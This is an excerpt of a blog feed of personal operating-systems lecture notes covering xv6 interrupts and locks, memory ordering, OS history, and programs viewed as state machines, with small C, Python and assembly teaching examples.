<h2 id="Case-Study-ls"><a href="#Case-Study-ls" class="headerlink" title="Case Study: ls"></a>Case Study: <code>ls</code></h2><p>We want to know how the command <code>ls</code> is typed into the console. In general, the keyboard connects to the receive line of UART. When a character is typed, UART generates an interrupt to let the kernel fetches that char.</p>
<p>When a interrupt is received by the kernel, usertrap()/kerneltrap() calls devintr() to check whether there’s an interrupt and do corresponding operations. devintr() calls plic_claim() to make the CPU core claim the type of device and call uartintr() to handle UART interrupt. In uartintr(), it calls uartgetc() to get the character <code>l</code> and <code>s</code>, and calls consoleintr() to put them into buffer.</p>
<h2 id="Interrupts-and-Concurrency"><a href="#Interrupts-and-Concurrency" class="headerlink" title="Interrupts and Concurrency"></a>Interrupts and Concurrency</h2><p>Concurrency issues in interrupts are difficult to tackle with. Here are some common concurrency problems:</p>
<ul>
<li>Devices and CPU cores run in parallel. It’s called producer-consumer parallelism and needs to be carefully managed.</li>
<li>Interrupts can stop the current program. If it stops the user program, the procedure is similar to traps. However, interrupt can also stop the kernel, which means that the instruction sequence in kernel code may not be continuous either now. We have to carefully enable/disable interrupts in kernel code to avoid crashing.</li>
<li>The top of drivers and the bottom of drivers may run in parallel. For example, when the shell program use <code>write()</code> system call to put a dollar prompt on the display, i.e. the top of the console driver is running, another CPU core may be handling interrupts from uart. The top and bottom share resources such as the buffer array. To make sure each core can see the correct, up-to-date content, we need a mechanism to ensure that only one core can do operations to shared resources at a time. Xv6 uses locks to realize that.</li>
</ul>
<p>Xv6 uses buffer array to address the producer-consumer parallelism. There are a read pointer and a write pointer for each buffer. The buffer is empty when <code>r==w</code>, the buffer is full when <code>w+1 mod BUFFER_SIZE==r</code>. The producer puts characters at the end of the queue and updates write pointer, while the consumer reads characters at the beginning of the queue and updates read pointer. Buffer array successfully decouple devices and CPU cores, making them able to run separately at high speed.</p>
<blockquote>
<p><strong>Q: Is there multiple buffer arrays, one for each CPU core?</strong></p>
<p>The buffer array is an array declared in <code>/kernel/uart.c</code> and is set in RAM. There’s only one RAM so there’s only one buffer array. There are several CPU cores running processes in parallel, and they may access the UART device at the same time, i.e. access the buffer array in parallel. </p>
<p>The main task for locking is to serialize accesses. Only the core that acquires the lock has access to the array and the read/write pointers. After it releases the lock, other cores can acquire the lock.</p>
</blockquote>
<h2 id="Interrupt-Evolution"><a href="#Interrupt-Evolution" class="headerlink" title="Interrupt Evolution"></a>Interrupt Evolution</h2><p>Interrupts used to be very fast because hardware is very simple in old times. Nowadays, interrupts are slow because devices are more complicated. They have to do lots of preliminary work before generating an interrupt. On the other hand, kernel design becomes more complicated and it takes longer to handle an interrupt.</p>
<p>For some fast devices, e.g. high performing network card, there may be a stream of packets and the period is even shorter than the interrupt handling time. In this case, we have another strategy - polling. The CPU keeps checking a particular control register, once there’s data in, the CPU handles it. For slow devices, polling wastes CPU cycles on checking registers, but if devices are fast, polling can save frequent entry/exit cost.</p>
<p>Nowadays, sophisticated devices can dynamically switch between polling and interrupts.</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 10: Multiprocessors and Locks</title>
    <url>/2022/03/12/MIT-6.S081%20Lecture%2010%20-%20Multiprocessors%20and%20Locks/</url>
    <content><![CDATA[<p>Applications may want multiple CPU cores, so the kernel must handle parallel system calls, e.g. carefully maintain shared data structure in parallel. We use locks to ensure correct sharing, but on the other hand, locks can limit performance.</p>
<p>The frequency of CPU clock gradually reaches a limit at 2010, which means that single thread performance cannot be optimized. However, the number of transistors keeps growing, so having multiple cores is our only choice to increase performance.</p>
<span id="more"></span>

<h2 id="Why-Lock"><a href="#Why-Lock" class="headerlink" title="Why Lock?"></a>Why Lock?</h2><p>We use lock to avoid race conditions. For example, if we delete the <code>acquire(kmem.lock)</code> and <code>release(kmem.lock)</code> in kfree(), it’s possible that pages are lost during freeing.</p>
<h2 id="Lock-Abstraction"><a href="#Lock-Abstraction" class="headerlink" title="Lock Abstraction"></a>Lock Abstraction</h2><p>The lock in xv6 is simply a struct:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> locked;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>there are two APIs: <code>acquire(struct lock *lk)</code> and <code>release(struct lock *lk)</code>，at one time, only one process can acquire the lock, and other processes have to wait until the first process calls release().</p>
<p>The area between acquire() and release() is called critical section. The code in critical sections are executed <strong>atomically</strong>, i.e. either <strong>all or none</strong> of the code is executed, it’s impossible for codes in the same critical section to interweave.</p>
<p>Programs usually have many locks, aiming at more parallelism. If there’s only one lock in the kernel, to ensure correctness, the lock must protects all the codes in the kernel (the so called ‘big kernel lock’). In this case, the execution of the whole kernel is serialized. If we use multiple locks, it’s allowable to let two processes using different locks run in parallel.</p>
<h2 id="When-to-Lock"><a href="#When-to-Lock" class="headerlink" title="When to Lock?"></a>When to Lock?</h2><p>A conservative rule (guideline): if 2 processes access a shared data structure and at least one operation is writing, then we have to lock that data structure.</p>
<p>From some aspects, the guideline is too strict: we can use lock-free programming. But lock-free programming is so tricky that we won’t cover that. From some aspects, the guideline is too loose: in printf() we use lock to ensure that the printed message is atomic.</p>
<p>We may want data structures to automatically acquire and release locks when we’re accessing them, but there are cases when we need more flexible lock management. Consider a system call <code>rename()</code> . Suppose now we deal with <code>rename(&quot;d1/x&quot;, &quot;d2/y&quot;)</code>, if we act like this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lock(d1); erase(&quot;d1/x&quot;); release(d1); (**)</span><br><span class="line">lock(d2); add(&quot;d2/y&quot;); release(d2);</span><br></pre></td></tr></table></figure>

<p>then at time <code>**</code>, from other processes’ perspective, the file doesn’t exist! - obviously incorrect. The correct implementation is</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lock(d1 and d2); erase(&quot;d1/x&quot;); add(&quot;d2/y&quot;); release(d1 and d2);</span><br></pre></td></tr></table></figure>

<p>In this example, we see that sometimes we need multiple locks before doing operations.</p>
<h2 id="Lock-Perspectives"><a href="#Lock-Perspectives" class="headerlink" title="Lock Perspectives"></a>Lock Perspectives</h2><ul>
<li>Locks help avoid lost updates. (e.g. kfree() )</li>
<li>Locks make multi-step operations (critical section) atomic.</li>
<li>Locks help maintain invariants. (e.g. in kfree(), the lock protects moments when there are multiple pointers pointing to the head node.)</li>
</ul>
<h2 id="Deadlock"><a href="#Deadlock" class="headerlink" title="Deadlock"></a>Deadlock</h2><p>Let’s look at a case which may lead to deadlock:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CPU1                            CPU2</span><br><span class="line">rename(&quot;d1/x&quot;, &quot;d2/y&quot;)          rename(&quot;d2/a&quot;, &quot;d1/b&quot;)</span><br><span class="line">acquire(d1)                     acquire(d2)</span><br><span class="line">acquire(d2) &lt;-- blocked         acquire(d1) &lt;-- blocked</span><br></pre></td></tr></table></figure>

<p>The solution is to always acquire locks in order. (actually, it’s OK for CPU2 to acquire d1 and then d2 in this case.) Here the lock ordering is a partial order.</p>
<p>Lock makes modularity more complicated. Suppose a function f() in module 1 calls a function g() in module 2, f() must ensure that locks in g() will not violate global lock ordering, which means that the internals of module 2 (in terms of locks) must be visible to module 1, which somehow violates the module abstraction principle.</p>
<h2 id="Lock-Performance"><a href="#Lock-Performance" class="headerlink" title="Lock Performance"></a>Lock Performance</h2><p>Locks lead to serialization, which influences performance. To increase performance, we need to split up data structures and introduce more locks, which require lots of work.</p>
<p>A general approach is to firstly use coarse-grained locks, and do profiling tests to see whether we need smaller locks to increase parallelism.</p>
<h2 id="Code-Lock-Implementation"><a href="#Code-Lock-Implementation" class="headerlink" title="Code: Lock Implementation"></a>Code: Lock Implementation</h2><p>The most common way to acquire locks is to use the hardware test-and-set support. In RISC-V, we use the <code>amoswap addr, r1, r2</code> atomic instruction. It can be viewed as the following pseudo instructions:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lock addr</span><br><span class="line">	tmp   &lt;-- *addr</span><br><span class="line">	*addr &lt;-- r1</span><br><span class="line">	r2    &lt;-- tmp</span><br><span class="line">unlock addr</span><br></pre></td></tr></table></figure>

<p>Hardware test-and-set support is dependent on memory system. If the memories are sitting on a share bus, a memory controller (bus arbiter) is responsible for sorting the locks in order. If processors have caches, the cache coherence protocol will ensure the consistency.</p>
<p>In acquire() in xv6, we use the C function <code>__sync_lock_test_and_set()</code> to do atomic operations. Refer to Xv6 Source Code Manual for more details.  </p>
<p>In release(), we may wonder that why we still need to use atomic instruction to set the lock: a simple store instruction can finish that. However, the store instruction may be executed differently depending on architecture design. <code>sw</code> may be decomposed to several micro instructions, which leads to lost of atomicity.</p>
<h2 id="Code-Locks-and-Interrupts"><a href="#Code-Locks-and-Interrupts" class="headerlink" title="Code: Locks and Interrupts"></a>Code: Locks and Interrupts</h2><p>In acquire(), we must firstly turn off the interrupts. That’s because unexpected interrupts may cause deadlock. For example, in <code>/kernel/uart.c</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">uartputc</span><span class="params">(<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  acquire(&amp;uart_tx_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(panicked)&#123;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">uartintr</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// read and process incoming characters.</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">int</span> c = uartgetc();</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">-1</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    consoleintr(c);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send buffered characters.</span></span><br><span class="line">  acquire(&amp;uart_tx_lock);</span><br><span class="line">  uartstart();</span><br><span class="line">  release(&amp;uart_tx_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Suppose that we don’t turn off interrupts when holding locks, we acquire the lock <code>uart_tx_lock</code> in uartputc(), and when we’re in the critical section, the uart hardware sends an interrupt, leading us to uartintr(). In uartintr() the kernel tries to acquire the lock <code>uart_tx_lock</code>, but the lock is held by the interrupted thread, on the other hand, it’s impossible for the interrupted thread to move on unless interrupt handler returns. So a deadlock appears.</p>
<h2 id="Code-Memory-Ordering"><a href="#Code-Memory-Ordering" class="headerlink" title="Code: Memory Ordering"></a>Code: Memory Ordering</h2><p>Modern compilers and processors usually adjust instruction order to increase performance. For example,</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lock = <span class="number">1</span>;</span><br><span class="line">x = x + <span class="number">1</span>; <span class="comment">// ---+</span></span><br><span class="line">lock = <span class="number">0</span>;  <span class="comment">//    |</span></span><br><span class="line">           <span class="comment">// &lt;--+		</span></span><br></pre></td></tr></table></figure>

<p>It’s possible for compilers/processors to move <code>x = x + 1</code> to the end of the paragraph. If the code is executed in a single-core, serial mode, it’s absolutely OK and correct. But if it’s executed on mult-core processors, it’s a disaster.</p>
<p>To avoid such things, we can build a memory fence. In RISC-V, it’s a <code>mfence</code> instruction and it’s encapsulated as <code>__sync_synchronize()</code> in libc. We put memory fence at the beginning of acquire() and the end of release() to ensure that no instruction will be unexpectedly moved out of our critical section.</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 01: Introduction</title>
    <url>/2022/02/17/NJU-OS%20Lecture%2001%20-%20Introduction/</url>
    <content><![CDATA[<blockquote>
<h5 id="关于计算机信息"><a href="#关于计算机信息" class="headerlink" title="关于计算机信息"></a>关于计算机信息</h5><p>使用 <code>uname -a</code> 命令可以查看操作系统，时间，硬件架构等。</p>
</blockquote>
<span id="more"></span>

<h2 id="What-is-Operating-System"><a href="#What-is-Operating-System" class="headerlink" title="What is Operating System?"></a>What is Operating System?</h2><blockquote>
<p>Operating system is responsible for makeing it easy to run programs, allowing programs to share memory and interact with devices.  - OSTEP</p>
</blockquote>
<p>操作系统：“管理软硬件资源，为程序提供服务”的东西。</p>
<h3 id="ENIAC"><a href="#ENIAC" class="headerlink" title="ENIAC"></a>ENIAC</h3><ul>
<li><p>逻辑门：真空电子管。</p>
</li>
<li><p>存储器：延迟线内存，类似于“小丑扔球”的技巧，将数据不断地扔进延迟线，拿出来以后经过放大器再扔进延迟线。</p>
</li>
<li><p>输入输出：打一针/将纸带挪动一下。</p>
</li>
</ul>
<p>不需要操作系统。能运行程序就不错了，不需要“管理程序的程序”。</p>
<h3 id="1950s-Computer"><a href="#1950s-Computer" class="headerlink" title="1950s Computer"></a>1950s Computer</h3><p>更快更小的逻辑门 (晶体管)，更大的内存 (磁芯内存)，更丰富的 I/O 设备。因为 I/O 设备速度严重低于处理器速度，所以中断机制出现。更多的人使用通用计算机，他们希望使用 API，而不是直接使用硬件。因此诞生了 FORTRAN 编程语言。</p>
<p>1950s 的操作系统：管理多个程序依次排队运行的库函数和调度器。</p>
<ul>
<li>计算机非常贵非常少，多个用户排队使用计算机。<ul>
<li>很多程序卡片 $\rightarrow$ OS $\rightarrow$ 硬件</li>
</ul>
</li>
<li>操作 (operate) 任务 (job) 的系统 (system)<ul>
<li>批处理系统：程序自动切换 (换卡) + 提供库函数 API</li>
</ul>
</li>
</ul>
<h3 id="1960s-Computer"><a href="#1960s-Computer" class="headerlink" title="1960s Computer"></a>1960s Computer</h3><p>更大的内存，更多的高级语言 (COBOL, BASIC etc.) … 我们可以将多个程序同时放到程序里。但计算机中只有一个 CPU。</p>
<p>1960s 的操作系统：</p>
<ul>
<li><p>传统的执行流：A on CPU (30s) $\rightarrow$ A on device (5min) $\rightarrow$ A on CPU (30s) B on CPU (30s)</p>
</li>
<li><p>理想的执行流：</p>
<p>  CPU:         A on CPU(30s) $\rightarrow$ OS 调度 $\rightarrow$ B on CPU (30s)         $\rightarrow$ OS 调度 $\rightarrow$ A on CPU</p>
<p>  Device:                                                   $\rightarrow$ A on device (5min)</p>
</li>
</ul>
<p>这就是多道程序 (multiprogramming)。为了防止恶意程序对别的程序和操作系统本身的破坏，我们还需要对每个程序的运行有一个好的隔离机制。</p>
<p>多道程序在程序使用设备时发生切换。在引入时钟中断后，操作系统成为计算机的霸主：操作系统决定谁来运行。</p>
<h3 id="1970s-Computer"><a href="#1970s-Computer" class="headerlink" title="1970s+ Computer"></a>1970s+ Computer</h3><p>计算机空前发展，与今天已无大异。</p>
<p>分时系统趋于成熟，UNIX 诞生，奠定现代操作系统的形态。</p>
<h3 id="Today"><a href="#Today" class="headerlink" title="Today"></a>Today</h3><p>操作系统：虚拟化硬件资源，为应用程序提供服务。</p>
<p>面对的问题：</p>
<ul>
<li>更复杂的处理器和内存：非对称多处理器， Non-uniform Memory Access etc.。</li>
<li>更多的设备和资源。</li>
<li>……</li>
</ul>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 02: Programs on Operating Systems</title>
    <url>/2022/02/18/NJU-OS%20Lecture%2002%20-%20Programs%20on%20Operating%20Systems/</url>
    <content><![CDATA[<h2 id="Digital-Logic"><a href="#Digital-Logic" class="headerlink" title="Digital Logic"></a>Digital Logic</h2><p>数字电路：</p>
<ul>
<li>状态：寄存器中保存的值；</li>
<li>初始状态：RESET；</li>
<li>迁移：组合逻辑电路下计算寄存器下一个周期的值。</li>
</ul>
<span id="more"></span>

<h3 id="Example-Seven-seg"><a href="#Example-Seven-seg" class="headerlink" title="Example: Seven-seg"></a>Example: Seven-seg</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// logisim.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGS_FOREACH(_)  _(X) _(Y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTS_FOREACH(_)  _(A) _(B) _(C) _(D) _(E) _(F) _(G)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RUN_LOGIC        X1 = !X &amp;&amp; Y; \</span></span><br><span class="line"><span class="meta">                         Y1 = !X &amp;&amp; !Y; \</span></span><br><span class="line"><span class="meta">                         A  = (!X &amp;&amp; !Y) || (X &amp;&amp; !Y); \</span></span><br><span class="line"><span class="meta">                         B  = 1; \</span></span><br><span class="line"><span class="meta">                         C  = (!X &amp;&amp; !Y) || (!X &amp;&amp; Y); \</span></span><br><span class="line"><span class="meta">                         D  = (!X &amp;&amp; !Y) || (X &amp;&amp; !Y); \</span></span><br><span class="line"><span class="meta">                         E  = (!X &amp;&amp; !Y) || (X &amp;&amp; !Y); \</span></span><br><span class="line"><span class="meta">                         F  = (!X &amp;&amp; !Y); \</span></span><br><span class="line"><span class="meta">                         G  = (X &amp;&amp; !Y); </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE(X)   static int X, X##1;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UPDATE(X)   X = X##1;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT(X)    printf(#X <span class="meta-string">&quot; = %d; &quot;</span>, X);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  REGS_FOREACH(DEFINE);</span><br><span class="line">  OUTS_FOREACH(DEFINE);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// clock</span></span><br><span class="line">    RUN_LOGIC;</span><br><span class="line">    OUTS_FOREACH(PRINT);</span><br><span class="line">    REGS_FOREACH(UPDATE);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数字电路永远是根据当前状态机的状态确定次态，循环往复。上述程序用两个寄存器 X,Y 实现了七段数码管 0 $\rightarrow$ 1 $\rightarrow$ 2 循环更新的功能 (注：这段代码使用了一些 X-macros 技巧，使得我们无需对每个寄存器写相同的代码，值得学习。)</p>
<p>搭配上一个简单的 python 程序，我们便可以在终端中打印这个七段数码管：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># seven-seg.py</span></span><br><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"> </span><br><span class="line">TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\033[2J\033[1;1f</span></span><br><span class="line"><span class="string">     AAAAAAAAA</span></span><br><span class="line"><span class="string">    FF       BB</span></span><br><span class="line"><span class="string">    FF       BB</span></span><br><span class="line"><span class="string">    FF       BB</span></span><br><span class="line"><span class="string">    FF       BB</span></span><br><span class="line"><span class="string">     GGGGGGGGG</span></span><br><span class="line"><span class="string">    EE       CC</span></span><br><span class="line"><span class="string">    EE       CC</span></span><br><span class="line"><span class="string">    EE       CC</span></span><br><span class="line"><span class="string">    EE       CC</span></span><br><span class="line"><span class="string">     DDDDDDDDD</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line">BLOCK = &#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">&#x27;\033[37m░\033[0m&#x27;</span>, <span class="comment"># STFW: ANSI Escape Code</span></span><br><span class="line">    <span class="number">1</span>: <span class="string">&#x27;\033[31m█\033[0m&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">VARS = <span class="string">&#x27;ABCDEFG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> VARS:</span><br><span class="line">    <span class="built_in">globals</span>()[v] = <span class="number">0</span></span><br><span class="line">stdin = fileinput.<span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">exec</span>(stdin.readline())</span><br><span class="line">    pic = TEMPLATE</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> VARS:</span><br><span class="line">        pic = pic.replace(v, BLOCK[<span class="built_in">globals</span>()[v]]) <span class="comment"># &#x27;A&#x27; -&gt; BLOCK[A], ...</span></span><br><span class="line">    <span class="built_in">print</span>(pic)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关于该 python 程序的一些注解：</p>
<ul>
<li><code>exec(stdin.readline())</code> 用于将读入的内容直接当作 python 语句执行。由于之前的 C 程序在一行中用 <code>;</code> 将多个变量赋值分开，符合 python 语法，因此可以直接作为 python 程序中的变量赋值语句。</li>
<li>BLOCK[] 数组中存储了两种颜色：37 号是白色，31 号是红色。这里使用了 ANSI Escape Code，具体格式可以参考<a href="https://kristoff-starling.github.io/2022/02/18/ANSI%20Escape%20Code%20-%20Quick%20Manual/">这篇文章</a>。</li>
</ul>
</blockquote>
<h2 id="Programs-Code-Perspective"><a href="#Programs-Code-Perspective" class="headerlink" title="Programs: Code Perspective"></a>Programs: Code Perspective</h2><p>C 程序也是状态机：</p>
<ul>
<li>状态：堆+栈；</li>
<li>初始状态：main() 的第一条语句；</li>
<li>迁移：执行一条简单语句。</li>
</ul>
<p>从更 low-level 的角度而言，C 程序的状态机描述如下：</p>
<ul>
<li><p>状态：全局变量+栈帧的列表 (每个栈帧里有一个 PC 表示当前执行到哪里)；</p>
</li>
<li><p>初始状态：<code>main(argc, argv)</code>；</p>
</li>
<li><p>迁移：执行 top stack frame 中 PC 处的语句，PC++。</p>
<p>  函数的调用本质上就是新建一个栈帧放在栈帧列表的顶部，然后跳转到该栈帧中的第一条指令；函数的返回本质上就是将顶部的栈帧 pop 掉。</p>
</li>
</ul>
<h3 id="Example-Hanoi-nr"><a href="#Example-Hanoi-nr" class="headerlink" title="Example: Hanoi-nr"></a>Example: Hanoi-nr</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hanoi-nr.c</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> pc, n;</span><br><span class="line">  <span class="keyword">char</span> from, to, via;</span><br><span class="line">&#125; Frame;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> call(...) (&#123; *(++top) = (Frame) &#123; .pc = 0, __VA_ARGS__ &#125;; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret()     (&#123; top--; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> goto(loc) (&#123; f-&gt;pc = (loc) - 1; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hanoi</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span> from, <span class="keyword">char</span> to, <span class="keyword">char</span> via)</span> </span>&#123;</span><br><span class="line">  Frame stk[<span class="number">64</span>], *top = stk - <span class="number">1</span>;</span><br><span class="line">  call(n, from, to, via);</span><br><span class="line">  <span class="keyword">for</span> (Frame *f; (f = top) &gt;= stk; f-&gt;pc++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (f-&gt;pc) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">if</span> (f-&gt;n == <span class="number">1</span>) &#123; <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, f-&gt;from, f-&gt;to); <span class="keyword">goto</span>(<span class="number">4</span>); &#125; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;from, f-&gt;via, f-&gt;to);   <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: call(       <span class="number">1</span>, f-&gt;from, f-&gt;to,  f-&gt;via);  <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;via,  f-&gt;to,  f-&gt;from); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: ret();                                    <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>switch-case 结构相当于给递归代码编上了“行号”。每个栈帧中的 PC 表示当前层函数执行到了第几行。</p>
<h2 id="Programs-Binary-Perspective"><a href="#Programs-Binary-Perspective" class="headerlink" title="Programs: Binary Perspective"></a>Programs: Binary Perspective</h2><p>从二进制的角度，程序仍然是状态机。</p>
<ul>
<li>状态：寄存器，内存……</li>
<li>迁移：执行一条指令</li>
</ul>
<p>如果整个程序的行为是确定的，状态机应该长成一条直线：$(M_0,R_0)\rightarrow (M_1,R_1)\rightarrow\cdots$ 。如果引入了一些 non-deterministic 的元素，比如 <code>rdrand</code> 指令 (读取一个硬件随机数到寄存器中)，那么状态机会有分叉。但无论如何，这是一个有限状态机 (内存、寄存器数量是有限的)，如果只有计算指令，有限步之后我们必然会回到一个经历过的状态。我们无法实现输入输出，甚至是停止程序。</p>
<p>因此，程序中有一条特殊的指令：<code>syscall</code>。程序将自己的状态机 $(M,R)$ 交给操作系统，任其修改，最终操作系统返回一个状态机 $(M’,R’)$，程序继续执行。因此程序=计算+syscall+计算+syscall+……</p>
<h3 id="Example-A-smallest-“Hello-world”"><a href="#Example-A-smallest-“Hello-world”" class="headerlink" title="Example: A smallest “Hello, world”"></a>Example: A smallest “Hello, world”</h3><p>我们想象中的最小函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _start() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接运行会得到 SIGSEGV。使用 GDB 对汇编代码进行调试：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x401000</span> &lt;_start&gt;       endbr64                                            </span><br><span class="line"><span class="number">0x401004</span> &lt;_start+<span class="number">4</span>&gt;     push   %rbp                                        </span><br><span class="line"><span class="number">0x401005</span> &lt;_start+<span class="number">5</span>&gt;     mov    %rsp,%rbp                                   </span><br><span class="line"><span class="number">0x401008</span> &lt;_start+<span class="number">8</span>&gt;     nop                                                </span><br><span class="line"><span class="number">0x401009</span> &lt;_start+<span class="number">9</span>&gt;     pop    %rbp                                        </span><br><span class="line"><span class="number">0x40100a</span> &lt;_start+<span class="number">10</span>&gt;    ret  </span><br></pre></td></tr></table></figure>

<p>执行 <code>ret</code> 指令时发生错误，因此 <code>ret</code> 的本质是将 %rax 的值赋给 PC，而此时 %rax 的值是一个非法的地址。</p>
<hr>
<p>用户程序只能解决“计算”的问题，因此我们甚至无法结束程序。我们必须借助系统调用才能使程序正常运行起来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># minimal.S</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">  movq $SYS_write, %rax   # write(</span><br><span class="line">  movq $1,         %rdi   #   fd=1,</span><br><span class="line">  movq $st,        %rsi   #   buf=st,</span><br><span class="line">  movq $(ed - st), %rdx   #   count=ed-st</span><br><span class="line">  syscall                 # );</span><br><span class="line"></span><br><span class="line">  movq $SYS_exit,  %rax   # exit(</span><br><span class="line">  movq $1,         %rdi   #   status=1</span><br><span class="line">  syscall                 # );</span><br><span class="line"></span><br><span class="line">st:</span><br><span class="line">  .ascii &quot;\033[01;31mHello, OS World\033[0m\n&quot;</span><br><span class="line">ed:</span><br></pre></td></tr></table></figure>

<p>前半段程序负责打印：将系统调用号 SYS_write 和输出对象，输出内容等参数放到 x86-64 制定的寄存器中，然后使用 syscall 指令；后半段负责退出。</p>
<p>使用 <code>gcc -c minimal.S &amp;&amp; ld minimal.S &amp;&amp; ./a.out</code> 命令，可以得到红色加粗的 “Hello, OS World”。</p>
<h2 id="Switching-between-Perspectives"><a href="#Switching-between-Perspectives" class="headerlink" title="Switching between Perspectives"></a>Switching between Perspectives</h2><p>记源代码为 $S$，汇编代码为 $S$，则编译器就是一个函数：$S=compile(S)$。</p>
<p>从状态机的视角来看，编译 (优化) 的正确性 (soundness) 的含义是：两个状态机的可观测行为完全一致。因此在保证整体语义不变的前提下，编译器可以自由地调整语句顺序，合并语句，删除无用语句等。</p>
